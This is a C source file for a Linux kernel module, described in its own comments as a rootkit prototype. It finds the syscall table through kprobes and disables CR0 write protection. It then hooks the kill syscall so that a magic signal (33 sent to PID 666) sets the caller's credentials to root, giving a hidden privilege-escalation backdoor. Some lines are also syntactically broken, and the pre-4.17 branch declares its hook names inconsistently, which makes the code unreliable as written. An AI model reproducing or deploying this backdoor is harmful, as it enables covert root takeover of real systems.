#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#include <linux/kprobes.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Sargastico");
MODULE_DESCRIPTION("Not a rootkit prototype");
MODULE_VERSION("6.66");

unsigned long cr0;
unsigned long *syscall_table;
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);


/* 
Neat approach to retrieve "kallsyms_lookup" function pointer when this symbol is not exported by the kernel.
Using "kprobes": "Kprobes enables you to dynamically break into any kernel routine and collect debugging and 
performance information non-disruptively. You can trap at almost any kernel code address" 

src: https://www.kernel.org/doc/Documentation/kprobes.txt 
*/

static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};

unsigned long get_kallsyms_lkpname(void) {

    register_kprobe(&kp);
    kallsyms_lookup_name_t kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);

    return kallsyms_lookup_name;

}

/* 
Using the "kallsyms_lookup_name" to get "sys_call_table" address 

src: https://elixir.bootlin.com/linux/latest/source/kernel/kallsyms.c

(line 164 you lazy 'n' silly duck)
*/

unsigned long* findSyscallTable(void) {
	
    kallsyms_lookup_name_t kallsyms_lookup_name = get_kallsyms_lkpname();

    unsigned long *syscall_table;

    syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");

    if syscall_table == 0 {
        return NULL
    }

    return syscall_table;

}

/*
The bit 16 of CR0 Register is the WP (Write Protection). Inhibits writing on memory "read-only" pages.
Normally the "write protection" is enable. But we don't want only "read" things, we want to write some sh1tty.
So what we need is to disable the 16th bit of CR0. And if you think about some crazy bitmask, you are right!

bitmask op: cr0 & ~0x00010000 <--- THIS SET WP = 0

if you don't know what a bitmask is or fears some asm lines, get out!
*/

// Write 'val' to cr0 with some asm stuff
static inline void writeCr0(unsigned long val) {

	unsigned long __force_order;

	asm volatile(

		"mov %0, %%cr0"
		: "+r"(val), "+m"(__force_order)
        
    );

}

// Disable cr0 write protection (wp = 0)
static inline void unprotectMemory(void) {

    writeCr0(cr0 & ~0x00010000);

}

// Restores original cr0 (wp = 1)
static inline void protectMemory(void) {

    writeCr0(cr0);

}

/*
We need to check the kernel version before declaring the hooking functions.
Basically, the new calling convention for syscalls changed in kernels 4.17.0 and above. The arguments are now stored 
in registes and copied into a struct called "pt_reges", and then this is the only thing passed to the syscall.

The old syscall calling convention (pre-4.17.0) can be found on all sys_call reference tables around the internet: 
https://www.ime.usp.br/~kon/MAC211/syscalls.html

The following code will implement the newer pt_regs convention as well as the pre-4.17.0 kernel version.
*/
#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_kill)(const struct pt_regs *);

asmlinkage int kill_hook(const struct pt_regs *regs) {

    void set_root(void);

    pid_t pid = regs->di;
    int sig = regs->si;

    if ( sig == 33 && pid == 666 )
    {
        printk(KERN_INFO "[+] giving root...\n");
        set_root();
        return 0;
    }

    return orig_kill(regs);

}
#else

static asmlinkage long (*kill_hook)(pid_t pid, int sig);
static asmlinkage int kill_hook(pid_t pid, int sig) {

    void set_root(void);

    if ( sig == 33 && pid == 666 )
    {
        printk(KERN_INFO "[+] giving root...\n");
        set_root();
        return 0;
    }

    return orig_kill(pid, sig);
}
#endif

/*
Giving root to ourselves.
https://blog.cubieserver.de/2018/modify-process-credentials-in-linux-kernel/
*/
void set_root(void) {

    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    commit_creds(root);
}

static int __init s4t4n_init(void) {

    syscall_table = findSyscallTable();
    if (!syscall_table) {
        printk(KERN_INFO "[-] KERNEL NOT SUPPORTED :(");
		return -1;
    }

    printk(KERN_INFO "[+] Syscall table address: 0x%p \n", syscall_table);

    cr0 = read_cr0();

    unprotectMemory();

    orig_kill = (void*)syscall_table[__NR_kill];

    printk(KERN_INFO "[+] Original sys_kill: 0x%x", orig_kill);

    syscall_table[__NR_kill] = kill_hook;

    protectMemory();

    printk(KERN_INFO "[+] Hook Function Addr: 0x%x", kill_hook);
    printk(KERN_INFO "[+] New overwrite sys_kill Addr: 0x%x", syscall_table[__NR_kill]);

    return 0;
}

static void __exit s4t4n_exit(void) {

    unprotectMemory();

    syscall_table[__NR_kill] = orig_kill;

    protectMemory();

    printk("Good Bye Kernel ;) \n");

}

module_init(s4t4n_init);
module_exit(s4t4n_exit);